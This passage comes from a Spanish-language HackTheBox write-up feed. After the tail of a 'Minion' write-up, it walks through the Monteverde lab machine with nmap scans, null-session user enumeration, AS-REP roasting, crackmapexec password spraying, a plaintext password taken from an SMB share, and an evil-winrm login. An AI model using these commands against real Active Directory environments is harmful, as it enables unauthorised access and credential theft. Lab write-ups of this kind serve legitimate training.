Discovered open port 49152/tcp on 10.10.10.57
Discovered open port 49156/tcp on 10.10.10.57
Discovered open port 49155/tcp on 10.10.10.57
Discovered open port 5985/tcp on 10.10.10.57
Discovered open port 47001/tcp on 10.10.10.57
Completed SYN Stealth Scan at 12:51, 27.30s elapsed (65535 total ports)
Nmap scan report for 10.10.10.57
Host is up, received user-set (0.21s latency).
Scanned at 2023-10-16 12:50:43 -05 for 28s
Not shown: 65521 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       REASON
80/tcp    open  http          syn-ack ttl 127
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
5985/tcp  open  wsman         syn-ack ttl 127
47001/tcp open  winrm         syn-ack ttl 127
49152/tcp open  unknown       syn-ack ttl 127
49153/tcp open  unknown       syn-ack ttl 127
49154/tcp open  unknown       syn-ack ttl 127
49155/tcp open  unknown       syn-ack ttl 127
49156/tcp open  unknown       syn-ack ttl 127
49157/tcp open  unknown       syn-ack ttl 127
62696/tcp open  unknown       syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.38 seconds
           Raw packets sent: 131072 (5.767MB) | Rcvd: 40 (1.600KB)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podriamos tratar de conectarnos por a traves del puerto 3389 por &lt;code&gt;RDP&lt;/code&gt;, ejecutar el &lt;code&gt;root.txt&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

</description>
        <pubDate>Tue, 17 Oct 2023 00:00:00 -0500</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Minion</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Minion</guid>
        
        <category>Server Site Request Forgery - SSRF</category>
        
        <category>ICMP Reverse Shell</category>
        
        <category>Firewall Bypassing</category>
        
        <category>Weak Permissions</category>
        
        <category>Information Disclosure</category>
        
        <category>Alternative Data Streams - ADS</category>
        
        <category>Firewall Rule Manipulation</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Monteverde - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Monteverde&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;windows&lt;/code&gt; de dificultad media, para esta ocasión vamos a volver a enfrentarnos contra un &lt;code&gt;DC&lt;/code&gt; donde obtendremos usuarios a traves de &lt;code&gt;rpc&lt;/code&gt; y con ayuda de &lt;code&gt;crackmapexec&lt;/code&gt; mediante un ataque de fuerza bruta conseguiremos credenciales validas, que nos permitiran listar los recursos compartidos del sistema y conectarnos con otras credenciales al sistema y finalmente abusaremos del grupo &lt;code&gt;Azure Admins&lt;/code&gt; para explotar un &lt;code&gt;Azure AD Sync&lt;/code&gt; con lo que nos haremos con las credenciales administrativas del dominio.&lt;/p&gt;

&lt;p&gt;Maquina interesenta asi que vamos a darle!.&lt;/p&gt;

&lt;p&gt;Comenzamos como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Monteverde
❯ ls

 Monteverde
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.172
PING 10.10.10.172 (10.10.10.172) 56(84) bytes of data.
64 bytes from 10.10.10.172: icmp_seq=1 ttl=127 time=147 ms

--- 10.10.10.172 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 147.473/147.473/147.473/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.172 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-13 17:17 -05
Initiating SYN Stealth Scan at 17:17
Scanning 10.10.10.172 [65535 ports]
Discovered open port 139/tcp on 10.10.10.172
Discovered open port 53/tcp on 10.10.10.172
Discovered open port 445/tcp on 10.10.10.172
Discovered open port 135/tcp on 10.10.10.172
Discovered open port 49676/tcp on 10.10.10.172
Discovered open port 593/tcp on 10.10.10.172
Discovered open port 49667/tcp on 10.10.10.172
Discovered open port 49674/tcp on 10.10.10.172
Discovered open port 9389/tcp on 10.10.10.172
Discovered open port 5985/tcp on 10.10.10.172
Discovered open port 3269/tcp on 10.10.10.172
Discovered open port 636/tcp on 10.10.10.172
Discovered open port 464/tcp on 10.10.10.172
Discovered open port 49673/tcp on 10.10.10.172
Discovered open port 64934/tcp on 10.10.10.172
Discovered open port 389/tcp on 10.10.10.172
Discovered open port 88/tcp on 10.10.10.172
Discovered open port 49697/tcp on 10.10.10.172
Discovered open port 3268/tcp on 10.10.10.172
Completed SYN Stealth Scan at 17:18, 40.69s elapsed (65535 total ports)
Nmap scan report for 10.10.10.172
Host is up, received user-set (0.18s latency).
Scanned at 2023-10-13 17:17:44 -05 for 40s
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49697/tcp open  unknown          syn-ack ttl 127
64934/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 40.80 seconds
           Raw packets sent: 196591 (8.650MB) | Rcvd: 39 (1.716KB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49697,64934 10.10.10.172 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-13 17:19 -05
Nmap scan report for 10.10.10.172
Host is up (0.66s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-13 22:19:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
64934/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2023-10-13T22:20:53
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.74 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entre los puertos abiertos mas relevantes podemos visualizar:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;53&lt;/td&gt;
      &lt;td&gt;DNS&lt;/td&gt;
      &lt;td&gt;Simple DNS Plus&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;88&lt;/td&gt;
      &lt;td&gt;KERBEROS&lt;/td&gt;
      &lt;td&gt;Microsoft Windows Kerberos&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;135&lt;/td&gt;
      &lt;td&gt;MSRPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;139&lt;/td&gt;
      &lt;td&gt;NETBIOS&lt;/td&gt;
      &lt;td&gt;Microsoft Windows netbios-ssn&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;445&lt;/td&gt;
      &lt;td&gt;SMB&lt;/td&gt;
      &lt;td&gt;?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3268&lt;/td&gt;
      &lt;td&gt;LDAP&lt;/td&gt;
      &lt;td&gt;Microsoft Windows Active Directory LDAP&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5985&lt;/td&gt;
      &lt;td&gt;WINRM&lt;/td&gt;
      &lt;td&gt;Microsoft HTTPAPI httpd 2.0&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotacion&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Como vemos que el puerto &lt;code&gt;445&lt;/code&gt; esta abierto, con &lt;code&gt;crackpamexec&lt;/code&gt; vamos a tratar de enumerar a lo que nos enfrentamos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.172
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos ver que estamos ante un &lt;code&gt;Windows 10&lt;/code&gt;, ahora tambien vemos el dominio asociado para agregarlo a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.172 MEGABANK.LOCAL&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como nos enfrentamos contra un &lt;code&gt;Domain Controller&lt;/code&gt; podemos tratar de enumerar usuarios validos con &lt;code&gt;rpclient&lt;/code&gt; a traves de un &lt;code&gt;null session&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rpcclient -U '' 10.10.10.172 -N -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]'
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Guardamos las credenciales en un archivo de nombre &lt;code&gt;users.txt&lt;/code&gt; y podemos tratar de efectuar un &lt;code&gt;ASREProast Attack&lt;/code&gt; para tratar de obtener un &lt;code&gt;TGT - ticket granting ticket&lt;/code&gt;, pero no da resultado.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ GetNPUsers.py -no-pass -usersfile users.txt MEGABANK.LOCAL/
Impacket v0.11.0 - Copyright 2023 Fortra

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User AAD_987d7f2f57d2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mhope doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SABatchJobs doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-ata doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-bexec doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-netapp doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dgalanos doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User roleary doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User smorgan doesn't have UF_DONT_REQUIRE_PREAUTH set
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora bien en vista que tenemos un listado potencial de usuarios validos podemos tratar de realizar fuerza bruta con &lt;code&gt;crackmapexec&lt;/code&gt; usando la misma lista de usuarios como posibles contraseñas.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.172 -u users.txt -p users.txt --continue-on-success
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:svc-netapp STATUS_LOGON_FAILURE 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos unas credenciales validas &lt;code&gt;SABatchJobs:SABatchJobs&lt;/code&gt; y con estas podemos tratar de enumerar los recursos compartidos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs'
    IP: 10.10.10.172:445	Name: MEGABANK.LOCAL                                    
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	azure_uploads                                     	READ ONLY	
	C$                                                	NO ACCESS	Default share
	E$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	users$                                            	READ ONLY	
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si vamos a las ruta de &lt;code&gt;users$&lt;/code&gt; encontramos dentro del directorio &lt;code&gt;mhope&lt;/code&gt; un archivo &lt;code&gt;azure.xml&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' -r 'users$/mhope'
    IP: 10.10.10.172:445	Name: MEGABANK.LOCAL                                    
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	users$                                            	READ ONLY	
	users\$mhope
	dr--r--r--                0 Fri Jan  3 08:41:18 2020	.
	dr--r--r--                0 Fri Jan  3 08:41:18 2020	..
	fw--w--w--             1212 Fri Jan  3 09:59:24 2020	azure.xml
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos descargamos el archivo y al leerlo vemos una nueva contraseña &lt;code&gt;4n0therD4y@n0th3r$&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' --download 'users$/mhope/azure.xml'
[+] Starting download: users$\mhope\azure.xml (1212 bytes)
[+] File output to: /home/fmiracle/machines/Monteverde/content/10.10.10.172-users_mhope_azure.xml
❯ mv 10.10.10.172-users_mhope_azure.xml azure.xml
❯ /bin/cat azure.xml
&amp;lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&amp;gt;
  &amp;lt;Obj RefId=&quot;0&quot;&amp;gt;
    &amp;lt;TN RefId=&quot;0&quot;&amp;gt;
      &amp;lt;T&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/T&amp;gt;
      &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt;
    &amp;lt;/TN&amp;gt;
    &amp;lt;ToString&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/ToString&amp;gt;
    &amp;lt;Props&amp;gt;
      &amp;lt;DT N=&quot;StartDate&quot;&amp;gt;2020-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;
      &amp;lt;DT N=&quot;EndDate&quot;&amp;gt;2054-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;
      &amp;lt;G N=&quot;KeyId&quot;&amp;gt;00000000-0000-0000-0000-000000000000&amp;lt;/G&amp;gt;
      &amp;lt;S N=&quot;Password&quot;&amp;gt;4n0therD4y@n0th3r$&amp;lt;/S&amp;gt;
    &amp;lt;/Props&amp;gt;
  &amp;lt;/Obj&amp;gt;
&amp;lt;/Objs&amp;gt;#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ya que obtuvimos una nueva credencial, vamos a hacer lo mismo que antes con &lt;code&gt;Crackmapexec&lt;/code&gt; pero esta vez con esta contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.172 -u users.txt -p '4n0therD4y@n0th3r$' --continue-on-success
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos nuevas credenciales validas &lt;code&gt;mhope:4n0therD4y@n0th3r$&lt;/code&gt; y como vimos que el puerto &lt;code&gt;5085&lt;/code&gt; se encuentra abierto, podemos tratar de conectarnos con &lt;code&gt;evil-winrm&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents&amp;gt; whoami
megabank\mhope
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez como el usuario &lt;code&gt;mhpe&lt;/code&gt;, podemos dirigirnos a su directorio personal y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;*Evil-WinRM* PS C:\Users\mhope\Documents&amp;gt; cd ..\Desktop
*Evil-WinRM* PS C:\Users\mhope\Desktop&amp;gt; type user.txt
603f2f5e0f8e217d541fb0572da2d55c
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;elevacion-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#elevacion-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

